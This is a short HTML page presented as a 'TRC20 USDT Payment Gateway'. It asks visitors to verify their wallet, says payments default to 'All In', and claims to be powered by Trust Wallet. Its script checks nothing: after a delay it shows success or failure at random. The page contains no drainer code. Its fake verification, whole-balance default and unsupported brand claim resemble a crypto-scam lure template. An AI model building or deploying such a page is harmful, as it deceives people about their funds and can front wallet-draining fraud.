<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRC20 USDT Payment Gateway</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f7fc;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        header {
            background-color: #2c3e50;
            color: #fff;
            width: 100%;
            text-align: center;
            padding: 20px;
        }

        h1 {
            font-size: 2.5rem;
        }

        .logo {
            width: 100px;
            height: 100px;
            margin: 20px;
        }

        .container {
            width: 80%;
            max-width: 600px;
            text-align: center;
        }

        button {
            padding: 12px 25px;
            font-size: 1rem;
            background-color: #3498db;
            border: none;
            color: white;
            cursor: pointer;
            margin: 10px 0;
            border-radius: 5px;
        }

        .verify-msg {
            display: none;
            font-size: 1.2rem;
            margin: 20px 0;
            color: #2ecc71;
        }

        .verify-msg.failed {
            color: #e74c3c;
        }

        .loader {
            display: none;
            margin: 10px 0;
        }

        .all-in {
            font-weight: bold;
            font-size: 1.2rem;
            margin-top: 10px;
        }

        .footer {
            font-size: 0.8rem;
            color: #7f8c8d;
            margin-top: 20px;
        }

    </style>
</head>
<body>

<header>
    <img class="logo" src="https://your-logo-link.com/logo.png" alt="TRC20 Logo">
    <h1>TRC20 USDT Payment Gateway</h1>
</header>

<div class="container">
    <p>Please verify your wallet before making the payment.</p>
    <button id="verifyBtn">Verify USDT</button>
    <p class="all-in">By default, your payment will be set to All In.</p>
    <div class="loader">Processing...</div>
    <p class="verify-msg" id="verifyMsg"></p>
    <p>If everything is correct, you will be able to send your payment.</p>
</div>

<div class="footer">
    <p>Payment Powered by Trust Wallet</p>
</div>

<script>
    document.getElementById('verifyBtn').addEventListener('click', function () {
        document.querySelector('.loader').style.display = 'inline-block';
        document.getElementById('verifyMsg').style.display = 'none';
        
        // Simulating verification process
        setTimeout(function () {
            // Change this part with actual verification logic
            const isVerified = Math.random() > 0.5; // Random for simulation
            
            if (isVerified) {
                document.querySelector('.loader').style.display = 'none';
                document.getElementById('verifyMsg').textContent = 'USDT Verified Successfully!';
                document.getElementById('verifyMsg').classList.remove('failed');
                document.getElementById('verifyMsg').classList.add('success');
            } else {
                document.querySelector('.loader').style.display = 'none';
                document.getElementById('verifyMsg').textContent = 'Verification Failed. Please try again.';
                document.getElementById('verifyMsg').classList.add('failed');
                document.getElementById('verifyMsg').classList.remove('success');
            }
            document.getElementById('verifyMsg').style.display = 'block';
        }, 3000); // Simulated delay for verification
    });
</script>

</body>
</html>
